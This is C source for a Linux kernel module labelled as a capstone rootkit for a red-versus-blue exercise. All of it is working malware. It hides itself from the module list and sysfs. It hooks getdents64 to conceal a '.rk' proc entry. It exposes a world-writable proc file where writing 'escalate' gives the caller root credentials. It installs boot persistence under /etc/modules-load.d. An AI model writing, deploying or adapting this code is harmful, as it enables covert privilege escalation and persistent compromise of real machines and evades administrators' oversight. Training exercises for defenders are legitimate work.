// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/umh.h>

#define HIDDEN_PROC ".rk"
#define PERSIST_PATH "/etc/modules-load.d/hello.conf"

static struct proc_dir_entry *proc_entry;

// --- module hiding ---

static void hide_module(void)
{
	list_del_init(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
}

// --- getdents64 kretprobe: hide .rk from /proc listings ---

struct getdents_ctx {
	struct linux_dirent64 __user *dirent;
};

static int entry_getdents64(struct kretprobe_instance *ri,
			    struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	struct pt_regs *uregs = (struct pt_regs *)regs->di;

	ctx->dirent = (struct linux_dirent64 __user *)uregs->si;
	return 0;
}

static int ret_getdents64(struct kretprobe_instance *ri,
			  struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	long ret = regs_return_value(regs);
	struct linux_dirent64 *cur;
	char *buf;
	long off;

	if (ret <= 0)
		return 0;

	buf = kmalloc(ret, GFP_ATOMIC);
	if (!buf)
		return 0;

	if (copy_from_user_nofault(buf, ctx->dirent, ret)) {
		kfree(buf);
		return 0;
	}

	off = 0;
	while (off < ret) {
		cur = (struct linux_dirent64 *)(buf + off);
		if (strcmp(cur->d_name, HIDDEN_PROC) == 0) {
			long rest = ret - off - cur->d_reclen;

			if (rest > 0)
				memmove(buf + off,
					buf + off + cur->d_reclen, rest);
			ret -= cur->d_reclen;
			continue;
		}
		off += cur->d_reclen;
	}

	if (copy_to_user_nofault(ctx->dirent, buf, ret))
		ret = -EFAULT;
	regs_set_return_value(regs, ret);
	kfree(buf);
	return 0;
}

static struct kretprobe gd_krp = {
	.kp.symbol_name	= "__x64_sys_getdents64",
	.entry_handler	= entry_getdents64,
	.handler	= ret_getdents64,
	.data_size	= sizeof(struct getdents_ctx),
	.maxactive	= 20,
};

// --- proc interface (hidden, accessible by direct path) ---

static int status_read(struct seq_file *m, void *v)
{
	seq_printf(m, "hidden=yes\npersistence=%s\nescalation=write escalate\n",
		   PERSIST_PATH);
	return 0;
}

static int status_open(struct inode *inode, struct file *file)
{
	return single_open(file, status_read, NULL);
}

static ssize_t status_write(struct file *file, const char __user *buf,
			    size_t count, loff_t *pos)
{
	char command[16];
	size_t len = min(count, sizeof(command) - 1);
	struct cred *cred;

	if (copy_from_user_nofault(command, buf, len))
		return -EFAULT;
	command[len] = '\0';
	if (strcmp(command, "escalate") != 0)
		return -EINVAL;

	cred = prepare_creds();
	if (!cred)
		return -ENOMEM;
	cred->uid = GLOBAL_ROOT_UID;
	cred->gid = GLOBAL_ROOT_GID;
	cred->euid = GLOBAL_ROOT_UID;
	cred->egid = GLOBAL_ROOT_GID;
	cred->suid = GLOBAL_ROOT_UID;
	cred->sgid = GLOBAL_ROOT_GID;
	cred->fsuid = GLOBAL_ROOT_UID;
	cred->fsgid = GLOBAL_ROOT_GID;
	commit_creds(cred);
	return count;
}

static const struct proc_ops status_ops = {
	.proc_open = status_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
	.proc_write = status_write,
};

// --- boot persistence ---

static void install_persistence(void)
{
	struct file *f;
	loff_t off = 0;
	char *argv[] = { "/bin/sh", "-c", "mkdir -p /etc/modules-load.d", NULL };
	char *envp[] = { "PATH=/bin:/sbin", NULL };

	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return;
	kernel_write(f, "hello\n", 6, &off);
	filp_close(f, NULL);
}

static void remove_persistence(void)
{
	char *argv[] = { "/bin/sh", "-c", "rm -f " PERSIST_PATH, NULL };
	char *envp[] = { "PATH=/bin:/sbin", NULL };

	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

// --- init/exit ---

static int __init rootkit_init(void)
{
	int err;

	proc_entry = proc_create(HIDDEN_PROC, 0666, NULL, &status_ops);
	if (!proc_entry)
		return -ENOMEM;

	err = register_kretprobe(&gd_krp);
	if (err) {
		proc_remove(proc_entry);
		return err;
	}

	install_persistence();
	hide_module();

	pr_info("rk: rootkit active\n");
	return 0;
}

static void __exit rootkit_exit(void)
{
	unregister_kretprobe(&gd_krp);
	proc_remove(proc_entry);
	remove_persistence();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Capstone 5: full rootkit for red vs blue exercise");
